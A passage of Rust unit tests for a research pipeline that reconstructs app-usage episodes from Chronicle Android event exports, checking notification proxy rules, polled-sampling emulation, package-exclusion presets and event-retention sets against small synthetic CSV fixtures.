            &[SourceDataRowRange { first: 1, last: 2 }],
            "clearing protected timing must not clear source-row lineage",
        );
        let control_final = final_row("P02");
        assert_eq!(control_final.interaction_type, APP_USAGE);
        assert_eq!(control_final.duration_seconds, Some(60.0));

        options.use_filter_file = true;
        let result = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles {
                filter_csv,
                ..PipelineV2SupportFiles::default()
            },
        )
        .expect("the complete filtered-resume transport runs");
        assert_eq!(result.app_row_count, 2);
        assert_eq!(result.opener_set_evidence, matched.opener_set_evidence);
        let app_rows = parse_csv_to_records_with_physical_rows(&result.app_csv_bytes.to_vec());
        assert!(
            app_rows.iter().any(|(_, row)| {
                row.get("app_package_name").map(String::as_str) == Some("com.example.secret")
                    && row.get("interaction_type").map(String::as_str) == Some(FILTERED_APP_USAGE)
            }),
            "the complete runner must restore the protected classification",
        );
        assert!(
            app_rows.iter().any(|(_, row)| {
                row.get("app_package_name").map(String::as_str) == Some("com.example.control")
                    && row.get("interaction_type").map(String::as_str) == Some(APP_USAGE)
            }),
            "the unfiltered control must remain ordinary scientific app usage",
        );
        let mut lineage = result
            .row_lineage
            .iter()
            .filter(|entry| entry.output_kind.as_str() == "app-csv")
            .map(|entry| entry.source_data_row_ranges.clone())
            .collect::<Vec<_>>();
        lineage.sort_by_key(|ranges| ranges[0].first);
        assert_eq!(
            lineage,
            vec![
                vec![SourceDataRowRange { first: 1, last: 2 }],
                vec![SourceDataRowRange { first: 3, last: 4 }],
            ],
            "the exported scientific rows must retain both original event ranges",
        );
    }

    /// B08 turns raw notification rows into an explicitly labelled proxy
    /// channel, and never into app usage.
    ///
    /// Chronicle records `Notification Seen` (Android type 10) and
    /// `Notification Interruption` (type 12) as app-scoped rows, and the
    /// app-usage reconstruction reads neither -- output rows are episodes, so
    /// today a notification row produces nothing at all. Each rule is checked
    /// against the same input so the source set is the only thing the
    /// assertions can be reading, and the headline CSV is compared across all
    /// four values to prove the axis cannot move it.
    #[test]
    fn the_notification_proxy_rule_decides_which_rows_become_labelled_contacts() {
        const RAW: &str = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // A two-minute episode of com.example.chat.
            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
            // Seen DURING that episode: contact the episode already accounts for.
            "Study,P01,Child,Chat,Notification Seen,com.example.chat,2026-03-07 10:01:00,UTC\n",
            "Study,P01,Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:02:00,UTC\n",
            // Seen AFTER it: the app reached the user without being opened.
            "Study,P01,Child,Chat,Notification Seen,com.example.chat,2026-03-07 10:30:00,UTC\n",
            // An interruption for an app that is never opened at all.
            "Study,P01,Child,News,Notification Interruption,com.example.news,2026-03-07 11:00:00,UTC\n",
        );

        let run = |rule: NotificationProxyRule| {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.notification_proxy_rule = rule;
            let result = run_pipeline_v2_with_supports(
                RAW.as_bytes(),
                &options,
                PipelineV2SupportFiles::default(),
            )
            .expect("pipeline run");
            let contacts = String::from_utf8(result.notification_contact_csv_bytes.to_vec())
                .expect("utf-8 notification contact csv");
            let rows: Vec<(String, String, String)> = contacts
                .lines()
                .skip(1)
                .map(|line| {
                    let fields: Vec<&str> = line.split(',').collect();
                    let header: Vec<&str> = contacts
                        .lines()
                        .next()
                        .expect("header row")
                        .split(',')
                        .collect();
                    let cell = |name: &str| {
                        fields[header
                            .iter()
                            .position(|candidate| *candidate == name)
                            .unwrap_or_else(|| panic!("contact csv has no {name} column"))]
                        .to_string()
                    };
                    (
                        cell("app_package_name"),
                        cell("interaction_type"),
                        cell("any_app_usage_flags"),
                    )
                })
                .collect();
            (
                rows,
                result.app_csv_bytes.to_vec(),
                result.notification_contact_row_count,
            )
        };

        // The default emits no channel at all.
        let (none_rows, baseline_app_csv, none_count) = run(NotificationProxyRule::None);
        assert!(none_rows.is_empty(), "the default emits no proxy rows");
        assert_eq!(none_count, 0);

        // Each rule admits exactly its own source type.
        let (seen_rows, seen_app_csv, seen_count) = run(NotificationProxyRule::SeenContactV1);
        assert_eq!(seen_count, 2);
        assert!(
            seen_rows
                .iter()
                .all(|(_, interaction_type, _)| interaction_type == NOTIFICATION_SEEN),
            "seen_contact_v1 admits only type 10, got {seen_rows:?}"
        );
        let (interruption_rows, interruption_app_csv, interruption_count) =
            run(NotificationProxyRule::InterruptionContactV1);
        assert_eq!(interruption_count, 1);
        assert_eq!(
            interruption_rows
                .iter()
                .map(|(package, _, _)| package.as_str())
                .collect::<Vec<_>>(),
            vec!["com.example.news"],
        );
        let (_, any_app_csv, any_count) = run(NotificationProxyRule::AnyNotificationContactV1);
        assert_eq!(any_count, 3, "the union of the two single-type rules");

        // The provenance is on the row: which rule emitted it, and whether the
        // instant is time the app-usage episodes already account for.
        //
        // Asserted against the whole line rather than a split cell: a row with
        // two flags carries them as `"['A', 'B']"`, a QUOTED field containing a
        // comma, and a bare split would shift every column after it.
        let contact_csv = {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.notification_proxy_rule = NotificationProxyRule::AnyNotificationContactV1;
            let result = run_pipeline_v2_with_supports(
                RAW.as_bytes(),
                &options,
                PipelineV2SupportFiles::default(),
            )
            .expect("pipeline run");
            String::from_utf8(result.notification_contact_csv_bytes.to_vec()).expect("utf-8")
        };
        let line_at = |timestamp: &str| {
            contact_csv
                .lines()
                .skip(1)
                .find(|line| line.contains(timestamp))
                .unwrap_or_else(|| panic!("no contact row at {timestamp}"))
                .to_string()
        };
        let inside = line_at("10:01:00");
        let outside = line_at("10:30:00");
        assert!(inside.contains("NOTIFICATION PROXY any_notification_contact_v1"));
        assert!(inside.contains("com.example.chat"));
        assert!(
            inside.contains(NOTIFICATION_WITHIN_USAGE_FLAG),
            "10:01 falls inside the 10:00-10:02 episode, got {inside}"
        );
        assert!(
            outside.contains(NOTIFICATION_OUTSIDE_USAGE_FLAG),
            "10:30 falls outside every episode of the package, got {outside}"
        );
        let never_opened = line_at("11:00:00");
        assert!(never_opened.contains("com.example.news"));
        assert!(
            never_opened.contains(NOTIFICATION_OUTSIDE_USAGE_FLAG),
            "a package that is never opened has no span to fall inside, got {never_opened}",
        );

        // A proxy contact NEVER carries a duration: a notification is an
        // instant, and this channel refuses to invent an interval for it.
        // Every column checked below precedes the quoted flag column, so an
        // index into a bare split is still exact for these four.
        let header: Vec<&str> = contact_csv
            .lines()
            .next()
            .expect("header")
            .split(',')
            .collect();
        for column in [
            "start_timestamp",
            "stop_timestamp",
            "duration_seconds",
            "duration_minutes",
        ] {
            let index = header
                .iter()
                .position(|candidate| *candidate == column)
                .unwrap_or_else(|| panic!("contact csv has no {column} column"));
            for line in contact_csv.lines().skip(1) {
                let fields: Vec<&str> = line.split(',').collect();
                assert_eq!(fields[index], "", "{column} must stay empty on a proxy row");
            }
        }

        // The headline output is byte-identical under every value. This is the
        // whole promise of a side-by-side channel.
        for (label, csv) in [
            ("seen_contact_v1", &seen_app_csv),
            ("interruption_contact_v1", &interruption_app_csv),
            ("any_notification_contact_v1", &any_app_csv),
        ] {
            assert_eq!(
                *csv, baseline_app_csv,
                "{label} changed the headline app CSV",
            );
        }
    }

    /// B09 re-derives the same timeline the way a POLLED collector would have
    /// measured it, and says on every row that it did.
    ///
    /// The two published conversions disagree with the event stream in
    /// OPPOSITE directions on the same input, which is the whole reason the
    /// axis exists: a researcher comparing Chronicle totals to a polled study
    /// is not comparing the same measurement, and the size of the difference
    /// depends on which polled rule the other study used.
    ///
    /// Cadence 10 s, gap 15 s -- both defaults, both named after their source.
    /// Grid instants fall on :00/:10/:20/... because every `HH:MM:00` UTC
    /// instant is a whole multiple of ten seconds since the epoch.
    #[test]
    fn polled_emulation_reports_each_published_conversion_and_its_sampling_loss() {
        const RAW: &str = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // E1: 35 s of com.example.a. Samples at :00 :10 :20 :30 -> four.
            "Study,P01,Child,A,Activity Resumed,com.example.a,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,A,Activity Paused,com.example.a,2026-03-07 10:00:35,UTC\n",
            // E2: 6 s of the same app, entirely BETWEEN two grid instants. The
            // first instant at or after 10:00:52 is 10:01:00, past the stop, so
            // a poller catches nothing at all. This episode is the sampling loss.
            "Study,P01,Child,A,Activity Resumed,com.example.a,2026-03-07 10:00:52,UTC\n",
            "Study,P01,Child,A,Activity Paused,com.example.a,2026-03-07 10:00:58,UTC\n",
            // E3: 25 s of a different package. Samples at :00 :10 :20 -> three.
            "Study,P01,Child,B,Activity Resumed,com.example.b,2026-03-07 10:02:00,UTC\n",
            "Study,P01,Child,B,Activity Paused,com.example.b,2026-03-07 10:02:25,UTC\n",
        );
        // 35 + 6 + 25. What the event stream actually observed.
        const OBSERVED_SECONDS: f64 = 66.0;

        let run = |method: PolledEmulationMethod| {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.polled_emulation_method = method;
            let result = run_pipeline_v2_with_supports(
                RAW.as_bytes(),
                &options,
                PipelineV2SupportFiles::default(),
            )
            .expect("pipeline run");
            let csv = String::from_utf8(result.polled_emulation_csv_bytes.to_vec())
                .expect("utf-8 polled emulation csv");
            (
                csv,
                result.app_csv_bytes.to_vec(),
                result.polled_emulation_row_count,
            )
        };
        // Flags travel as `"['A', 'B']"` -- a QUOTED cell containing commas --
        // so the duration is read by header position from a quoting-aware
        // split, and flag membership is asserted against the whole line.
        fn cells(line: &str) -> Vec<String> {
            let mut fields = vec![String::new()];
            let mut quoted = false;
            for character in line.chars() {
                match character {
                    '"' => quoted = !quoted,
                    ',' if !quoted => fields.push(String::new()),
                    _ => fields.last_mut().expect("a field is open").push(character),
                }
            }
            fields
        }
        let durations = |csv: &str| -> Vec<f64> {
            let header = cells(csv.lines().next().expect("header"));
            let column = header
                .iter()
                .position(|name| name == "duration_seconds")
                .expect("emulated csv has a duration_seconds column");
            csv.lines()
                .skip(1)
                .map(|line| {
                    cells(line)[column]
                        .parse::<f64>()
                        .expect("numeric duration")
                })
                .collect()
        };

        // The default emits no channel and no rows.
        let (none_csv, baseline_app_csv, none_count) = run(PolledEmulationMethod::None);
        assert!(none_csv.is_empty(), "the default emits no emulated channel");
        assert_eq!(none_count, 0);

        // Ross: endpoint subtraction across retained samples. Run one spans
        // :00 to :30 = 30 s for an app that was foreground 35 s; run two spans
        // :00 to :20 = 20 s for 25 s. Both understate, and the 6 s episode
        // vanishes entirely.
        let (ross_csv, ross_app_csv, ross_count) = run(PolledEmulationMethod::Ross2025SampledGapV1);
        assert_eq!(
            ross_count, 2,
            "one run per package, the 6 s episode is unsampled"
        );
        let ross = durations(&ross_csv);
        assert_eq!(ross, vec![30.0, 20.0]);
        assert!(
            ross.iter().sum::<f64>() < OBSERVED_SECONDS,
            "endpoint subtraction over samples cannot exceed the observed span",
        );

        // Cerit: retained sample count times cadence, never a subtraction. Four
        // samples are four whole cadences (40 s) even though the app was
        // foreground 35 s, so the SAME timeline now OVERSTATES.
        let (cerit_csv, cerit_app_csv, cerit_count) =
            run(PolledEmulationMethod::Cerit2025SampleCountV1);
        assert_eq!(cerit_count, 2);
        let cerit = durations(&cerit_csv);
        assert_eq!(cerit, vec![40.0, 30.0]);
        assert!(
            cerit.iter().sum::<f64>() > OBSERVED_SECONDS,
            "sample-count conversion rounds every partial cadence up to a whole one",
        );

        // The two published rules disagree by 20 s on 66 s of observed usage.
        // That disagreement is the measurement the axis publishes.
        assert_ne!(ross, cerit);

        // Nothing here may move the headline output.
        assert_eq!(baseline_app_csv, ross_app_csv);
        assert_eq!(baseline_app_csv, cerit_app_csv);

        // The provenance is on every row: which rule and cadence produced it,
        // and that it was never observed.
        for line in ross_csv.lines().skip(1) {
            assert!(
                line.contains("POLLED EMULATION ross_2025_sampled_gap_v1 @10s"),
                "every emulated row names its method and cadence, got {line}",
            );
            assert!(
                line.contains(POLLED_EMULATION_NOT_OBSERVED_FLAG),
                "every emulated row says it was not observed, got {line}",
            );
        }
        for line in cerit_csv.lines().skip(1) {
            assert!(line.contains("POLLED EMULATION cerit_2025_sample_count_v1 @10s"));
            assert!(line.contains(POLLED_EMULATION_NOT_OBSERVED_FLAG));
        }

        // Ross force-closes the trailing run so it counts, exactly as the
        // released code forces the last row's gap. Cerit counts samples and
        // never needed an end, so it forces nothing.
        let ross_lines: Vec<&str> = ross_csv.lines().skip(1).collect();
        assert!(
            !ross_lines[0].contains(POLLED_EMULATION_FORCED_TERMINAL_FLAG),
            "a run closed by a package change is not forced",
        );
        assert!(
            ross_lines[1].contains(POLLED_EMULATION_FORCED_TERMINAL_FLAG),
            "the trailing run is forced closed, got {}",
            ross_lines[1],
        );
        assert!(
            !cerit_csv.contains(POLLED_EMULATION_FORCED_TERMINAL_FLAG),
            "the sample-count rule forces nothing",
        );

        // Cadence is a real knob, not decoration: sampling the same timeline
        // every 30 s catches strictly fewer instants, so the Ross total drops.
        let coarse = {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.polled_emulation_method = PolledEmulationMethod::Ross2025SampledGapV1;
            options.polled_emulation_interval_seconds = 30.0;
            let result = run_pipeline_v2_with_supports(
                RAW.as_bytes(),
                &options,
                PipelineV2SupportFiles::default(),
            )
            .expect("pipeline run");
            String::from_utf8(result.polled_emulation_csv_bytes.to_vec()).expect("utf-8")
        };
        assert!(
            durations(&coarse).iter().sum::<f64>() < ross.iter().sum::<f64>(),
            "a coarser cadence loses more, not less",
        );
        assert!(
            coarse.contains("@30s"),
            "the row records the cadence it ran at"
        );

        // The cadence is a contract float, so a fractional one has to survive
        // into the flag. Integer division would render 7.5 s as `@7s`, and this
        // flag is the row's only statement of the instrument that produced it.
        let fractional = {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.polled_emulation_method = PolledEmulationMethod::Ross2025SampledGapV1;
            options.polled_emulation_interval_seconds = 7.5;
            let result = run_pipeline_v2_with_supports(
                RAW.as_bytes(),
                &options,
                PipelineV2SupportFiles::default(),
            )
            .expect("pipeline run");
            String::from_utf8(result.polled_emulation_csv_bytes.to_vec()).expect("utf-8")
        };
        assert!(
            fractional.contains("@7.5s"),
            "a fractional cadence must not be truncated in the provenance flag, got {fractional}",
        );
    }

    /// The B10 package-exclusion preset decides WHICH supplied rows exclude.
    ///
    /// The shipped default filter file carries an `app_filter_category` and a
    /// per-row `filter_bool`, and before this axis no kernel step read either:
    /// every supplied row excluded whatever its category, and a row a
    /// researcher had set to 0 was excluded anyway. Each preset is checked
    /// against the same three rows so the difference between them is the only
    /// thing the assertion can be reading.
    #[test]
    fn the_package_exclusion_preset_decides_which_supplied_rows_exclude() {
        const RAW: &str = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Launcher,Activity Resumed,com.android.launcher3,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,Launcher,Activity Paused,com.android.launcher3,2026-03-07 10:01:00,UTC\n",
            "Study,P01,Child,Carrier,Activity Resumed,com.carrier.app,2026-03-07 10:02:00,UTC\n",
            "Study,P01,Child,Carrier,Activity Paused,com.carrier.app,2026-03-07 10:03:00,UTC\n",
            "Study,P01,Child,Disabled,Activity Resumed,com.disabled.row,2026-03-07 10:04:00,UTC\n",
            "Study,P01,Child,Disabled,Activity Paused,com.disabled.row,2026-03-07 10:05:00,UTC\n",
        );
        // One system row, one carrier row, and one row the researcher disabled.
        const FILTER: &[u8] = concat!(
            "app_package_name,known_application_labels,app_filter_category,filter_bool\n",
            "com.android.launcher3,Launcher,system,1\n",
            "com.carrier.app,Carrier,carrier,1\n",
            "com.disabled.row,Disabled,system,0\n",
        )
        .as_bytes();

        let excluded_packages = |preset: PackageExclusionPreset, use_filter_file: bool| {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.use_filter_file = use_filter_file;
            options.package_exclusion_preset = preset;
            let result = run_pipeline_v2_with_supports(
                RAW.as_bytes(),
                &options,
                PipelineV2SupportFiles {
                    filter_csv: FILTER,
                    ..PipelineV2SupportFiles::default()
                },
            )
            .expect("pipeline run");
            let csv = String::from_utf8(result.app_csv_bytes.to_vec()).expect("utf-8 app csv");
            let mut lines = csv.lines();
            let header: Vec<&str> = lines.next().expect("header row").split(',').collect();
            let column = |name: &str| {
                header
                    .iter()
                    .position(|candidate| *candidate == name)
                    .unwrap_or_else(|| panic!("app csv has no {name} column"))
            };
            let (package_column, type_column) =
                (column("app_package_name"), column("interaction_type"));
            let mut excluded: Vec<String> = lines
                .filter_map(|line| {
                    let fields: Vec<&str> = line.split(',').collect();
                    (fields[type_column] == FILTERED_APP_USAGE)
                        .then(|| fields[package_column].to_string())
                })
                .collect();
            excluded.sort();
            (excluded, result.app_csv_bytes.to_vec())
        };

        // Default: every supplied row excludes, flag and category ignored.
        assert_eq!(
            excluded_packages(PackageExclusionPreset::AllSuppliedRows, true).0,
            vec![
                "com.android.launcher3",
                "com.carrier.app",
                "com.disabled.row"
            ],
        );
        // The disabled row stops excluding; the other two are unaffected.
        assert_eq!(
            excluded_packages(PackageExclusionPreset::HonorFilterFlag, true).0,
            vec!["com.android.launcher3", "com.carrier.app"],
        );
        // Only the system-family row excludes. `com.disabled.row` is category
        // `system` too, so this value ignores its flag exactly as documented --
        // the two narrowing rules are independent, not cumulative.
        assert_eq!(
            excluded_packages(PackageExclusionPreset::SystemScopeOnly, true).0,
            vec!["com.android.launcher3", "com.disabled.row"],
        );

        // The axis is inert while the filter file is off, whatever it is set to.
        let off_default = excluded_packages(PackageExclusionPreset::AllSuppliedRows, false).1;
        for preset in PackageExclusionPreset::ALL {
            assert_eq!(
                excluded_packages(preset, false).1,
                off_default,
                "{} changed output with the filter file off",
                preset.canonical_id(),
            );
        }
    }

    /// Excluding a package must not move anybody else's numbers, and the
    /// `any_app_*` family -- the one that exists to INCLUDE excluded packages --
    /// must keep measuring from the real episode.
    ///
    /// `classify_episode_durations` blanks a filtered row's DISPLAY interval so
    /// the emitted CSV carries no timing for an excluded package. The engagement
    /// walk used to read that blanked interval, substitute an `i64::MIN`
    /// sentinel and subtract anyway. The wrapping subtraction produced
    /// +2,069,578 hours on the filtered row, which read as a new engagement; the
    /// sentinel then became the next row's `previous_stop` and produced
    /// -2,069,578 hours there, clearing that row's engagement flags in turn. One
    /// package in the filter file corrupted two rows, and both junk values were
    /// baked into `tests/golden/app.csv`.
    ///
    /// The walk now reads the raw-episode evidence the same row still carries,
    /// so the `any_app_*` columns are byte-identical to the unfiltered run.
    #[test]
    fn excluding_a_package_does_not_move_the_any_app_family() {
        const RAW: &str = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Keep,Activity Resumed,com.example.keep,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,Secret,Activity Resumed,com.example.secret,2026-03-07 10:05:00,UTC\n",
            "Study,P01,Child,Secret,Activity Paused,com.example.secret,2026-03-07 10:06:00,UTC\n",
            "Study,P01,Child,Keep,Activity Paused,com.example.keep,2026-03-07 10:10:00,UTC\n",
            "Study,P01,Child,After,Activity Resumed,com.example.after,2026-03-07 10:20:00,UTC\n",
            "Study,P01,Child,After,Activity Paused,com.example.after,2026-03-07 10:30:00,UTC\n",
        );

        // (package, interaction_type, any_30s, any_custom_300s, any_switched, any_gap_hours)
        type AnyFamilyRow = (String, String, String, String, String, String);
        let any_family = |use_filter_file: bool| -> Vec<AnyFamilyRow> {
            let mut options = test_options();
            options.timezone = "UTC".into();
            options.use_filter_file = use_filter_file;
            let supports = PipelineV2SupportFiles {
                filter_csv:
                    b"app_package_name,known_application_labels\ncom.example.secret,Secret\n",
                ..PipelineV2SupportFiles::default()
            };
            let result = run_pipeline_v2_with_supports(RAW.as_bytes(), &options, supports)
                .expect("pipeline run");
            let csv = String::from_utf8(result.app_csv_bytes.to_vec()).expect("utf-8 app csv");
            let mut lines = csv.lines();
            let header: Vec<&str> = lines.next().expect("header row").split(',').collect();
            let column = |name: &str| {
                header
                    .iter()
                    .position(|candidate| *candidate == name)
                    .unwrap_or_else(|| panic!("app csv has no {name} column"))
            };
            let indices = [
                column("app_package_name"),
                column("interaction_type"),
                column("any_app_new_engage_30s"),
                column("any_app_new_engage_custom_300s"),
                column("any_app_switched_app"),
                column("any_app_usage_time_gap_hours"),
            ];
            lines
                .map(|line| {
                    let fields: Vec<&str> = line.split(',').collect();
                    let cell = |slot: usize| fields[indices[slot]].to_string();
                    (cell(0), cell(1), cell(2), cell(3), cell(4), cell(5))
                })
                .collect()
        };

        let unfiltered = any_family(false);
        let filtered = any_family(true);

        assert_eq!(
            filtered.len(),
            unfiltered.len(),
            "excluding a package changed the row count",
        );
        assert_eq!(
            filtered.iter().map(|row| row.0.clone()).collect::<Vec<_>>(),
            unfiltered
                .iter()
                .map(|row| row.0.clone())
                .collect::<Vec<_>>(),
            "excluding a package reordered or dropped rows",
        );

        // The ONLY difference the exclusion is allowed to make in these columns
        // is the row's own label.
        assert_eq!(
            filtered.iter().map(|row| row.1.clone()).collect::<Vec<_>>(),
            vec!["App Usage", "Filtered App Usage", "App Usage"],
        );
        assert_eq!(
            unfiltered
                .iter()
                .map(|row| row.1.clone())
                .collect::<Vec<_>>(),
            vec!["App Usage", "App Usage", "App Usage"],
        );
        let strip_label = |rows: &[AnyFamilyRow]| {
            rows.iter()
                .map(|row| {
                    (
                        row.0.clone(),
                        row.2.clone(),
                        row.3.clone(),
                        row.4.clone(),
                        row.5.clone(),
                    )
                })
                .collect::<Vec<_>>()
        };
        assert_eq!(
            strip_label(&filtered),
            strip_label(&unfiltered),
            "excluding a package moved the any_app_* family",
        );

        // Pinned so a joint regression cannot pass by corrupting both runs.
        // com.example.keep ends at 10:05 -- com.example.secret resuming is an
        // other-app stop for it -- so secret's gap is zero and after's gap is
        // 10:06 -> 10:20, i.e. 840 s = 0.2333... h.
        assert_eq!(
            strip_label(&filtered),
            vec![
                (
                    "com.example.keep".into(),
                    "1".into(),
                    "1".into(),
                    "0".into(),
                    "0.0".into()
                ),
                (
                    "com.example.secret".into(),
                    "0".into(),
                    "0".into(),
                    "1".into(),
                    "0.0".into()
                ),
                (
                    "com.example.after".into(),
                    "1".into(),
                    "1".into(),
                    "1".into(),
                    "0.23333333333333334".into()
                ),
            ],
        );
    }

    #[test]
    fn filtered_unbounded_episode_keeps_pre_filter_raw_evidence_and_receipt_counts() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Secret,Activity Resumed,com.example.secret,2026-03-07 10:00:00,UTC\n",
            "Study,P02,Child,Control,Activity Resumed,com.example.control,2026-03-07 10:00:00,UTC\n",
        );
        let filter_csv = b"app_package_name,known_application_labels\ncom.example.secret,Secret\n";
        let mut filtered = test_options();
        filtered.timezone = "UTC".into();
        filtered.correct_duplicate_event_timestamps = false;
        filtered.use_filter_file = true;
        filtered.minimum_usage_duration = 0.0;
        filtered.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
        filtered.micro_use_classification_policy_explicit = true;
        let mut unfiltered = filtered.clone();
        unfiltered.use_filter_file = false;

        let filtered_result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &filtered,
            PipelineV2SupportFiles {
                filter_csv,
                ..PipelineV2SupportFiles::default()
            },
        )
        .expect("filtered unbounded run");
        let unfiltered_result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &unfiltered,
            PipelineV2SupportFiles::default(),
        )
        .expect("unfiltered unbounded control");

        for result in [&filtered_result, &unfiltered_result] {
            assert_eq!(
                result
                    .foundational_semantics_evidence
                    .minimum_duration
                    .unbounded_episode_count,
                2,
            );
            assert_eq!(
                result
                    .foundational_semantics_evidence
                    .micro_use
                    .class_counts
                    .get("not_classifiable"),
                Some(&2),
            );
        }
        assert_eq!(
            filtered_result
                .foundational_semantics_evidence
                .minimum_duration
                .unbounded_episode_count,
            unfiltered_result
                .foundational_semantics_evidence
                .minimum_duration
                .unbounded_episode_count,
            "public package filtering must not erase immutable unbounded evidence",
        );
        let rows = parse_csv_to_records_with_physical_rows(&filtered_result.app_csv_bytes.to_vec());
        let secret = rows
            .iter()
            .find(|(_, row)| row["app_package_name"] == "com.example.secret")
            .expect("filtered missing-stop carrier row");
        assert_eq!(secret.1["start_timestamp"], "");
        assert_eq!(secret.1["micro_use_classification"], "not_classifiable");
    }

    /// Chronicle's two vendor spellings are aliases of the canonical type-1
    /// event. B02 therefore owes exact output and receipt equivalence, not just
    /// a unit assertion that normalization returns the same string.
    #[test]
    fn activity_resumed_aliases_are_end_to_end_equivalent_for_the_narrow_opener_arm() {
        type EpisodeBounds = (Option<i64>, Option<i64>);
        type AliasBaseline = (EpisodeBounds, PipelineV2Result);

        let mut options = test_options();
        options.timezone = "UTC".into();
        options.minimum_usage_duration = 0.0;
        options.correct_duplicate_event_timestamps = false;
        options.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
        options.opener_set = OpenerSet::ActivityResumedOnly;
        options.materialize_visualization_data = true;

        let mut baseline: Option<AliasBaseline> = None;
        for spelling in [
            "Move to Foreground",
            "Unknown importance: 1",
            ACTIVITY_RESUMED,
        ] {
            let csv = format!(
                concat!(
                    "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
                    "Study,P01,Target Child,Chat,{},com.example.chat,2026-03-07 10:00:00,UTC\n",
                    "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,UTC\n",
                ),
                spelling,
            );
            let canonical = canonical_test_rows(csv.as_bytes(), "UTC");
            assert_eq!(
                canonical
                    .iter()
                    .map(|row| row.interaction_type.as_str())
                    .collect::<Vec<_>>(),
                vec![ACTIVITY_RESUMED, ACTIVITY_PAUSED],
                "{spelling} did not normalize into the canonical lifecycle pair",
            );
            let retained = apply_event_retention(canonical, options.event_retention_set);
            let (materialized, matched) =
                match_and_materialize_activity_resumed_only(retained, &BTreeSet::new(), &options);
            let start = materialized
                .iter()
                .find(|row| row.start_timestamp_ns.is_some())
                .expect("the normalized opener materializes");
            let bounds = (start.start_timestamp_ns, start.stop_timestamp_ns);
            assert_eq!(
                matched.opener_set_evidence.applicability,
                OpenerSetApplicability {
                    requested: OpenerSet::ActivityResumedOnly,
                    effective: Some(OpenerSet::ActivityResumedOnly),
                    relation: OpenerStrategyRelation::BaselineEquivalent,
                    refusal_reason: None,
                },
            );
            assert_eq!(
                matched.opener_set_evidence.selected_opener_type_counts,
                BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 1)]),
            );
            assert_eq!(
                matched.opener_set_evidence.materialized_opener_type_counts,
                BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 1)]),
            );

            let classified = incremental::classify_episode_durations(
                materialized,
                &BTreeSet::new(),
                options.micro_use_classification_policy,
                options.minimum_usage_duration,
                options.minimum_duration_comparator,
                options.minimum_duration_disposition,
                &matched.selected_nonresume_closed_indices,
                &b06::MaximumDurationRowStage::omitted(),
            )
            .expect("classification with the omitted B06 shape never refuses");
            let episode = classified
                .iter()
                .find(|row| row.interaction_type == APP_USAGE)
                .expect("the normalized pair becomes scientific app usage");
            assert_eq!(episode.duration_seconds, Some(60.0));
            assert_eq!(
                (episode.start_timestamp_ns, episode.stop_timestamp_ns),
                bounds,
            );

            let result = run_pipeline_v2_with_supports(
                csv.as_bytes(),
                &options,
                PipelineV2SupportFiles::default(),
            )
            .unwrap_or_else(|error| panic!("{spelling} failed end to end: {error}"));
            assert_eq!(result.app_row_count, 1);
            assert_eq!(result.opener_set_evidence, matched.opener_set_evidence);

            if let Some((baseline_bounds, baseline_result)) = &baseline {
                assert_eq!(&bounds, baseline_bounds, "{spelling} changed bounds");
                assert_eq!(
                    result.app_csv_bytes, baseline_result.app_csv_bytes,
                    "{spelling} changed the scientific app export",
                );
                assert_eq!(
                    result.review_summary_json_bytes, baseline_result.review_summary_json_bytes,
                    "{spelling} changed the review summary",
                );
                assert_eq!(
                    result.visualization_data_json_bytes,
                    baseline_result.visualization_data_json_bytes,
                    "{spelling} changed visualization data",
                );
                assert_eq!(
                    result.row_lineage, baseline_result.row_lineage,
                    "{spelling} changed scientific source-row lineage",
                );
                assert_eq!(
                    result.opener_set_evidence, baseline_result.opener_set_evidence,
                    "{spelling} changed the effective B02 receipt",
                );
            } else {
                baseline = Some((bounds, result));
            }
        }
    }

    /// Parry & Toth do not retain type 2. This is the whole reason the axis
    /// exists separately from the reconstruction arm: the arm ports the
    /// Chronicle adaptation, which DOES close on a same-package Activity
    /// Paused, and the paper's own retained set does not contain that row at
    /// all. If this assertion ever flips, the two stop being distinguishable
    /// and the multiverse loses the comparison it was built to make.
    #[test]
    fn parry_toth_retains_the_screen_and_device_types_but_not_activity_paused() {
        let set = EventRetentionSet::ParryToth;
        for kept in [
            "Activity Resumed",
            "Filtered App Resumed",
            "Screen Interactive",
            "Screen Non-Interactive",
            "Keyguard Shown",
            "Keyguard Hidden",
            "Device Shutdown",
            "Device Startup",
        ] {
            assert!(set.retains(kept), "{kept} is in types 1/15/16/17/18/26/27");
        }
        for dropped in ["Activity Paused", "Filtered App Paused", "User Interaction"] {
            assert!(!set.retains(dropped), "{dropped} is not in their set");
        }
    }

    /// The Usage Logger set is the only one that keeps type 7, and the only
    /// reason `User Interaction` is worth reading from a Chronicle export.
    #[test]
    fn only_the_usage_logger_set_keeps_user_interaction() {
        for set in EventRetentionSet::ALL {
            let expected = matches!(
                set,
                EventRetentionSet::None | EventRetentionSet::UsageLogger
            );
            assert_eq!(
                set.retains("User Interaction"),
                expected,
                "{} disagrees about type 7",
                set.canonical_id()
            );
        }
